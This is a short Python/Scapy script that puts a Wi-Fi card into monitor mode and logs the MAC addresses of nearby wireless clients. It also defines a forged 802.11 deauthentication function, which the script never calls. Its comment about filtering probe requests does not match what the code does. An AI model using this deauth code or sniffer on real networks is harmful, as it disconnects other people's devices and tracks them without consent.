#!/usr/bin/env python

import os
import argparse
from scapy.all import *

#Sudo privileges needed
if os.geteuid() != 0:
    exit("You need to have root privileges to run this script.\nPlease try again, this time using 'sudo'. Exiting.")

parser = argparse.ArgumentParser()
parser.add_argument("interface", help="Interface to use in order to sniff packets. Should handle monitor mode.")
args = parser.parse_args()
iface = args.interface

#Scapy lib for packet injection/sniffing
#To put card in monitor mode : 
os.system("ifconfig " + iface + " down")
os.system("iwconfig " + iface + " mode monitor")
os.system("ifconfig " + iface + " up")

#Detected wireless clients
observedClients = []

#Try to deauthenticate the client
def deauth(p):
    sendp(RadioTap()/Dot11(type=0,subtype=12,addr1=p.addr2,addr2=p.addr3,addr3=p.addr3)/Dot11Deauth())

#Process each sniffed packet
def process(p):
    
    #We're only concerned by probe request packets
    #Also, sometime, addr2 is NoneType (don't know why actually)
    if not p.haslayer(Dot11) or p.addr2 is None :
	return
    
    if p.addr2 not in observedClients:
        print p.addr2 + " detected!"
	observedClients.append(p.addr2)

sniff(iface=iface,prn=process)
    

    
